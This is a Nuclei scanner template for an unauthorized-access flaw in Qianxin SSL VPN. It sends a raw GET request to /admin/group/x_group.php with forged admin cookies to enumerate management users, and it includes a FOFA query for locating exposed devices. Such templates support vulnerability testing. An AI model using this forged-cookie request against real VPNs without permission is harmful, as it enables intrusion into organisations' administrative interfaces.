id: qianxin-userlist-modify-user-password

info:
  name: 奇安信 VPN 未授权管理用户遍历
  author: Zhiliao
  severity: high
  description: |
    奇安信 SSL VPN 通过伪造 admin Cookie 可未授权访问用户组管理接口，遍历管理用户。
  reference:
    - https://cn-sec.com/archives/1785824.html
  metadata:
    max-request: 1
    fofa-query: app="奇安信-VPN"
  tags: qianxin,vpn,unauth

http:
  - raw:
      - |
        GET /admin/group/x_group.php?id=1 HTTP/1.1
        Host: {{Hostname}}
        Cookie: admin_id=1; gw_admin_ticket=1;

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'group_action.php'
          - 'anonymous'
        condition: and

      - type: status
        status:
          - 200
